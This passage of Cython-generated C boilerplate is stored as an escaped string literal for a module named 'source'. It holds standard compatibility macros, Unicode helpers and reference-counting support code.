*key) {\n  *key = PyThread_create_key();\n  return 0;\n}\nstatic CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {\n  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));\n  *key = Py_tss_NEEDS_INIT;\n  return key;\n}\nstatic CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {\n  PyObject_Free(key);\n}\nstatic CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {\n  return *key != Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {\n  PyThread_delete_key(*key);\n  *key = Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {\n  return PyThread_set_key_value(*key, value);\n}\nstatic CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {\n  return PyThread_get_key_value(*key);\n}\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\n#else\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\n#endif\n#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\n#else\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_""HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS\n#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\n#else\n#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)\n#endif\n#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)\n  #define CYTHON_PEP393_ENABLED 1\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_READY(op)       (0)\n  #else\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\n  #endif\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\n  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\n  #else\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\n    #else\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\n    #endif\n  #endif\n#else\n  #define CYTHON_PEP393_ENABLED 0\n  #define PyUnicode_1BYTE_KIND  1\n  #define PyUnicode_2BYTE_KIND  2\n  #define PyUnicode_4BYTE_KIND  4\n  #define __Pyx_PyUnicode_READY(op)       (0)\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u) ""  ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)\n  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\n#else\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)\n  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)\n  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)\n  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, \"__format__\", \"O\", fmt)\n#endif\n#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)\n#else\n  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)\n#endif\n#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)\n  #define PyObject_ASCII(o)            PyObject_Repr(o)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBaseString_Type            PyUnicod""e_Type\n  #define PyStringObject               PyUnicodeObject\n  #define PyString_Type                PyUnicode_Type\n  #define PyString_Check               PyUnicode_Check\n  #define PyString_CheckExact          PyUnicode_CheckExact\n#ifndef PyObject_Unicode\n  #define PyObject_Unicode             PyObject_Str\n#endif\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)\n  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)\n#else\n  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))\n  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))\n#endif\n#ifndef PySet_CheckExact\n  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)\n#endif\n#if PY_VERSION_HEX >= 0x030900A4\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\n#else\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\n#endif\n#if CYTHON_ASSUME_SAFE_MACROS\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\n#else\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyIntObject                  PyLongObject\n  #define PyInt_Type                   PyLong_Type\n  #define PyInt_Check(op)              PyLong_Check(op)\n  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)\n  #define PyInt_FromString             PyLong_FromString\n  #define PyInt_FromUnicode            PyLong_FromUnicode\n  #define PyInt_FromLong               PyLong_FromLong\n  #define PyInt_FromSize_t             PyLong_FromSize_t\n  #define PyInt_FromSsize_t            PyLong_FromSsize_t\n  #define PyInt_AsLong                 PyLong_AsLong\n  #define PyInt_AS_LONG                PyLong_AS_LONG\n  #define PyInt_AsSsize_t              PyLong_AsSsize_t\n  #define PyInt_AsUnsignedLongMa""sk     PyLong_AsUnsignedLongMask\n  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask\n  #define PyNumber_Int                 PyNumber_Long\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBoolObject                 PyLongObject\n#endif\n#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY\n  #ifndef PyUnicode_InternFromString\n    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\n  #endif\n#endif\n#if PY_VERSION_HEX < 0x030200A4\n  typedef long Py_hash_t;\n  #define __Pyx_PyInt_FromHash_t PyInt_FromLong\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t\n#else\n  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))\n#else\n  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)\n#endif\n#if CYTHON_USE_ASYNC_SLOTS\n  #if PY_VERSION_HEX >= 0x030500B1\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\n    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)\n  #else\n    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))\n  #endif\n#else\n  #define __Pyx_PyType_AsAsync(obj) NULL\n#endif\n#ifndef __Pyx_PyAsyncMethodsStruct\n    typedef struct {\n        unaryfunc am_await;\n        unaryfunc am_aiter;\n        unaryfunc am_anext;\n    } __Pyx_PyAsyncMethodsStruct;\n#endif\n\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\n  #if !defined(_USE_MATH_DEFINES)\n    #define _USE_MATH_DEFINES\n  #endif\n#endif\n#include <math.h>\n#ifdef NAN\n#define __PYX_NAN() ((float) NAN)\n#else\nstatic CYTHON_INLINE float __PYX_NAN() {\n  float value;\n  memset(&value, 0xFF, sizeof(value));\n  return value;\n}\n#endif\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\n#define __Pyx_truncl trunc\n#else\n#define __Pyx_truncl truncl\n#endif\n\n#define __P""YX_MARK_ERR_POS(f_index, lineno) \\\n    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\n\n#ifndef __PYX_EXTERN_C\n  #ifdef __cplusplus\n    #define __PYX_EXTERN_C extern \"C\"\n  #else\n    #define __PYX_EXTERN_C extern\n  #endif\n#endif\n\n#define __PYX_HAVE__source\n#define __PYX_HAVE_API__source\n/* Early includes */\n#ifdef _OPENMP\n#include <omp.h>\n#endif /* _OPENMP */\n\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\n#define CYTHON_WITHOUT_ASSERTIONS\n#endif\n\ntypedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;\n                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;\n\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)\n#define __PYX_DEFAULT_STRING_ENCODING \"\"\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\n#define __Pyx_long_cast(x) ((long)x)\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py""_ssize_t limit) {\n    return (size_t) i < (size_t) limit;\n}\n#if defined (__cplusplus) && __cplusplus >= 201103L\n    #include <cstdlib>\n    #define __Pyx_sst_abs(value) std::abs(value)\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) abs(value)\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) labs(value)\n#elif defined (_MSC_VER)\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define __Pyx_sst_abs(value) llabs(value)\n#elif defined (__GNUC__)\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\n#else\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\n#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\n#if PY_MAJOR_VERSION < 3\n    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#else\n    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize\n#endif\n#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsSString(s)    ((const signed"" char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\n#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {\n    const Py_UNICODE *u_end = u;\n    while (*u_end++) ;\n    return (size_t)(u_end - u - 1);\n}\n#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))\n#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\n#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)\n#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);\n#define __Pyx_PySequence_Tuple(obj)\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_""t(size_t);\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\n#if CYTHON_ASSUME_SAFE_MACROS\n#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\n#else\n#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\n#endif\n#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))\n#if PY_MAJOR_VERSION >= 3\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\n#else\n#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))\n#endif\n#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\nstatic int __Pyx_sys_getdefaultencoding_not_ascii;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    PyObject* ascii_chars_u = NULL;\n    PyObject* ascii_chars_b = NULL;\n    const char* default_encoding_c;\n    sys = PyImport_ImportModule(\"sys\");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) \"getdefaultencoding\", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    if (strcmp(default_encoding_c, \"ascii\") == 0) {\n        __Pyx_sys_getdefaultencoding_not_ascii = 0;\n    } else {\n        char ascii_chars[128];\n        int c;\n        for (c = 0; c < 128; c++) {\n            ascii_chars[c] = c;\n        }\n        __Pyx_sys_getdefaultencoding_not_ascii = 1;\n        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);\n        if (!ascii_chars_u) goto bad;\n        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);\n        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {\n            PyErr_For""mat(\n                PyExc_ValueError,\n                \"This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.\",\n                default_encoding_c);\n            goto bad;\n        }\n        Py_DECREF(ascii_chars_u);\n        Py_DECREF(ascii_chars_b);\n    }\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    Py_XDECREF(ascii_chars_u);\n    Py_XDECREF(ascii_chars_b);\n    return -1;\n}\n#endif\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\n#else\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\nstatic char* __PYX_DEFAULT_STRING_ENCODING;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    char* default_encoding_c;\n    sys = PyImport_ImportModule(\"sys\");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) \"getdefaultencoding\", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);\n    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;\n    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    return -1;\n}\n#endif\n#endif\n\n\n/* Test for GCC > 2.95 */\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\n  #define likely(x)   __builtin_expect(!!(x), 1)\n  #define unlikely(x) __builtin_expect(!!(x), 0)\n#else /* !__GNUC__ or GCC < 2.95 */\n  #define likely(x)   (x)\n  #define unlikely""(x) (x)\n#endif /* __GNUC__ */\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\n\nstatic PyObject *__pyx_m = NULL;\nstatic PyObject *__pyx_d;\nstatic PyObject *__pyx_b;\nstatic PyObject *__pyx_cython_runtime = NULL;\nstatic PyObject *__pyx_empty_tuple;\nstatic PyObject *__pyx_empty_bytes;\nstatic PyObject *__pyx_empty_unicode;\nstatic int __pyx_lineno;\nstatic int __pyx_clineno = 0;\nstatic const char * __pyx_cfilenm= __FILE__;\nstatic const char *__pyx_filename;\n\n\nstatic const char *__pyx_f[] = {\n  \"source.py\",\n};\n\n/*--- Type declarations ---*/\n\n/* --- Runtime support code (head) --- */\n/* Refnanny.proto */\n#ifndef CYTHON_REFNANNY\n  #define CYTHON_REFNANNY 0\n#endif\n#if CYTHON_REFNANNY\n  typedef struct {\n    void (*INCREF)(void*, PyObject*, int);\n    void (*DECREF)(void*, PyObject*, int);\n    void (*GOTREF)(void*, PyObject*, int);\n    void (*GIVEREF)(void*, PyObject*, int);\n    void* (*SetupContext)(const char*, int, const char*);\n    void (*FinishContext)(void**);\n  } __Pyx_RefNannyAPIStruct;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\n#ifdef WITH_THREAD\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          if (acquire_gil) {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          } else {\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\n          }\n#else\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)\n#endif\n  #define __Pyx_RefNannyFinishContext()\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)""\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)\n  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)\n  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)\n  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)\n#else\n  #define __Pyx_RefNannyDeclarations\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\n  #define __Pyx_RefNannyFinishContext()\n  #define __Pyx_INCREF(r) Py_INCREF(r)\n  #define __Pyx_DECREF(r) Py_DECREF(r)\n  #define __Pyx_GOTREF(r)\n  #define __Pyx_GIVEREF(r)\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\n  #define __Pyx_XGOTREF(r)\n  #define __Pyx_XGIVEREF(r)\n#endif\n#define __Pyx_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_DECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_DECREF(tmp);\\\n    } while (0)\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\n\n/* PyObjectGetAttrStr.proto */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\n#else\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\n#endif\n\n/* GetBuiltinName.proto */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\n\n/* Import.proto */\nstatic PyObject *__Pyx_Import(P""yObject *name, PyObject *from_list, int level);\n\n/* decode_c_string_utf16.proto */\nstatic CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16(const char *s, Py_ssize_t size, const char *errors) {\n    int byteorder = 0;\n    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);\n}\nstatic CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16LE(const char *s, Py_ssize_t size, const char *errors) {\n    int byteorder = -1;\n    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);\n}\nstatic CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16BE(const char *s, Py_ssize_t size, const char *errors) {\n    int byteorder = 1;\n    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);\n}\n\n/* decode_c_bytes.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(\n         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,\n         const char* encoding, const char* errors,\n         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors));\n\n/* decode_bytes.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_decode_bytes(\n         PyObject* string, Py_ssize_t start, Py_ssize_t stop,\n         const char* encoding, const char* errors,\n         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {\n    return __Pyx_decode_c_bytes(\n        PyBytes_AS_STRING(string), PyBytes_GET_SIZE(string),\n        start, stop, encoding, errors, decode_func);\n}\n\n/* PyCFunctionFastCall.proto */\n#if CYTHON_FAST_PYCCALL\nstatic CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);\n#else\n#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)\n#endif\n\n/* PyFunctionFastCall.proto */\n#if CYTHON_FAST_PYCALL\n#define __Pyx_PyFunction_FastCall(func, args, nargs)\\\n    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)\n#if 1 || PY_VERSION_HEX < 0x030600B1\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObj""ect **args, Py_ssize_t nargs, PyObject *kwargs);\n#else\n#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, 